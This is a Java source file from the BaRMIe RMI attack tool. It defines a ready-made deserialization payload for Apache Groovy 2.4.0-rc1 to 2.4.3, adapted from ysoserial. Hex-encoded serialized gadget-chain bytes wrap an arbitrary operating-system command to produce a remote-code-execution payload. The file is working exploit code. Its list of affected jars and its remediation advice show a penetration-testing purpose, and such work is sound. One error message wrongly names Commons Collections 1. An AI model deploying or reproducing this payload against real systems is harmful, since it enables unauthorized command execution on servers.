package nb.barmie.modes.attack.deser.payloads;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import nb.barmie.exceptions.BaRMIeDeserPayloadGenerationException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;

/***********************************************************
 * Deserialization payload for Apache Groovy versions
 * 2.4.0-rc1 to 2.4.3.
 * 
 * Based on the ysoserial and the excellent work of Chris
 * Frohoff, Matthias Kaiser et al
 * (https://github.com/frohoff/ysoserial).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class GroovyPayload2 extends DeserPayload {
	/*******************
	 * Properties
	 ******************/
	//Payload data chunks
	private final String _header_chunk = "7372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b707870737d00000001000d6a6176612e7574696c2e4d617070787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707372002c6f72672e636f6465686175732e67726f6f76792e72756e74696d652e436f6e766572746564436c6f7375726510233719f715dd1b0200014c000a6d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b707872002d6f72672e636f6465686175732e67726f6f76792e72756e74696d652e436f6e76657273696f6e48616e646c65721023371ad601bc1b0200024c000864656c65676174657400124c6a6176612f6c616e672f4f626a6563743b4c000b68616e646c6543616368657400284c6a6176612f7574696c2f636f6e63757272656e742f436f6e63757272656e74486173684d61703b707870737200296f72672e636f6465686175732e67726f6f76792e72756e74696d652e4d6574686f64436c6f737572658f1031acf59cf2cc0200014c00066d6574686f6471007e0009707872001367726f6f76792e6c616e672e436c6f737572653ca0c76616126c5a0200084900096469726563746976654900196d6178696d756d4e756d6265724f66506172616d657465727349000f7265736f6c766553747261746567794c000362637774003c4c6f72672f636f6465686175732f67726f6f76792f72756e74696d652f63616c6c736974652f426f6f6c65616e436c6f73757265577261707065723b4c000864656c656761746571007e000b4c00056f776e657271007e000b5b000e706172616d6574657254797065737400125b4c6a6176612f6c616e672f436c6173733b4c000a746869734f626a65637471007e000b7078700000000000000002000000007074";
	private final String _footer_chunk = "71007e0013757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9902000070787000000002767200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007078707672000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e00097078707074000765786563757465737200266a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74486173684d61706499de129d87293d03000349000b7365676d656e744d61736b49000c7365676d656e7453686966745b00087365676d656e74737400315b4c6a6176612f7574696c2f636f6e63757272656e742f436f6e63757272656e74486173684d6170245365676d656e743b7078700000000000000000757200315b4c6a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74486173684d6170245365676d656e743b52773f41329b397402000070787000000000707078740008656e747279536574767200126a6176612e6c616e672e4f766572726964650000000000000000000000707870";
	
	/*******************
	 * Set payload properties
	 ******************/
	public GroovyPayload2() {
		super();
		this.setName("Groovy2");
		this.setDescription("Apache Groovy 2.4.0-rc1 to 2.4.3");
		this.setRemediationAdvice("[Apache Groovy] Update to Apache Groovy 2.4.4 or greater.");
		this.setAffectedJars(new String[] {
			"groovy-all-2.4.0.jar", "groovy-all-2.4.0-rc-1.jar", "groovy-all-2.4.0-rc-2.jar", "groovy-all-2.4.1.jar", "groovy-all-2.4.2.jar", "groovy-all-2.4.3.jar", "groovy-2.4.0.jar", "groovy-2.4.0-rc-1.jar",
			"groovy-2.4.0-rc-2.jar", "groovy-2.4.1.jar", "groovy-2.4.2.jar", "groovy-2.4.3.jar"
		});
	}
	
	/*******************
	 * Generate payload bytes for the given OS command, correcting references
	 * by the given amount.
	 * 
	 * @param cmd The operating system command to execute.
	 * @param refCorrection The amount to correct TC_REFERENCE handles by (see note above).
	 * @return An array of bytes making up the deserialization payload.
	 ******************/
	public byte[] getBytes(String cmd, int refCorrection) throws BaRMIeException {
		ByteArrayOutputStream out;
		
		//Generate the payload bytes
		try {
			//Fix references in the header bytes and add them to the output
			out = new ByteArrayOutputStream();
			out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));
			
			//Add the command string to the output
			out.write(this.stringToUtf8ByteArray(cmd));
			
			//Fix references in the footer bytes and add them to the output
			out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));
		} catch(IOException ioe) {
			throw new BaRMIeDeserPayloadGenerationException("Failed to build Commons Collections 1 deserialization payload.", ioe);
		}
		
		//Return the payload bytes
		return out.toByteArray();
	}
}
